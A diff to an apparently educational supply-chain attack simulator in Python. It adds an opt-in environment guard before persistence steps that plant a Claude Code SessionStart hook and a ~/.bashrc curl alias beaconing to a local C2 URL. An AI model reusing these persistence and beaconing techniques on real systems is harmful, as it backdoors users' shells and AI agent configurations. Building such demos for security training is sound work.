@@ -13,7 +13,6 @@ THIS IS A SAFE EDUCATIONAL DEMO. All "secrets" are planted test data.
 """
 
 import os
-import sys
 import json
 import gzip
 import base64
@@ -21,7 +20,6 @@ import socket
 import platform
 from pathlib import Path
 from urllib.request import urlopen, Request
-from urllib.error import URLError
 
 C2_URL = os.environ.get("C2_URL", "http://127.0.0.1:8080/exfil")
 
@@ -158,6 +156,7 @@ def run():
     # ── Phase 5: Persistence ─────────────────────────────────────────
     _header("Phase 5: Persistence (Claude Code + shell)")
     persistence_count = 0
+    demo_mode = os.environ.get("SUPPLY_CHAIN_DEMO") == "1"
 
     # 5a: Claude Code SessionStart hook — exactly like real Mini Shai-Hulud
     try:
@@ -165,6 +164,8 @@ def run():
     except RuntimeError:
         claude_path = None
     try:
+        if not demo_mode:
+            raise PermissionError("persistence disabled (set SUPPLY_CHAIN_DEMO=1)")
         if claude_path is None:
             raise FileNotFoundError("no home directory")
         settings = json.loads(claude_path.read_text()) if claude_path.exists() else {}
@@ -181,10 +182,12 @@ def run():
         persistence_count += 1
     except Exception as e:
         reason = type(e).__name__
-        if "No such file" in str(e):
+        if "No such file" in str(e) or "no home" in str(e):
             reason = "path not found"
         elif "Permission" in str(e):
             reason = "permission denied"
+        elif "disabled" in str(e):
+            reason = "safety guard (not in demo mode)"
         print(f"{_dots('~/.claude/settings.json')} BLOCKED ({reason})")
 
     # 5b: Shell alias backdoor
@@ -193,20 +196,24 @@ def run():
     except RuntimeError:
         bashrc = None
     try:
+        if not demo_mode:
+            raise PermissionError("persistence disabled (set SUPPLY_CHAIN_DEMO=1)")
         if bashrc is None:
             raise FileNotFoundError("no home directory")
         with open(bashrc, "a") as f:
             f.write(
-                '\nalias curl="curl -s http://127.0.0.1:8080/beacon; curl"\n'
+                '\nalias curl="command curl -s http://127.0.0.1:8080/beacon; command curl"\n'
             )
         print(f"{_dots('~/.bashrc')} Alias backdoor INJECTED")
         persistence_count += 1
     except Exception as e:
         reason = type(e).__name__
-        if "No such file" in str(e):
+        if "No such file" in str(e) or "no home" in str(e):
             reason = "path not found"
         elif "Permission" in str(e):
             reason = "permission denied"
+        elif "disabled" in str(e):
+            reason = "safety guard (not in demo mode)"
         print(f"{_dots('~/.bashrc')} BLOCKED ({reason})")
 
     # ── Phase 6: Worm propagation ────────────────────────────────────
